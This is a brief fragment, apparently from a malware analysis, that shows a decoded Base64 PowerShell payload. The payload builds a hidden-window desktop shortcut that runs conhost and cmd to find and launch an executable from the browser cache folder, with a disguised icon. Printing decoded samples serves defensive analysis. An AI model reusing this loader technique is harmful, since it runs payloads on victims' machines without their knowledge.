<b>Base64 string decoded:</b>

$shell = New-Object -ComObject WScript.Shell;$desktop = [System.Environment]::GetFolderPath('Desktop');$shortcut = $shell.CreateShortcut("$desktop\%filename%.lnk");$shortcut.TargetPath = "C:\windows\system32\conhost.exe";$shortcut.WindowStyle = 7;$shortcut.Arguments = 'cmd.exe /c cd %USERPROFILE%\AppData\Local\Microsoft\Windows\INetCache & dir /s /B %filename%*.exe | cmd.exe /k';$shortcut.IconLocation = "%lnk%?.ico";$shortcut.Save();
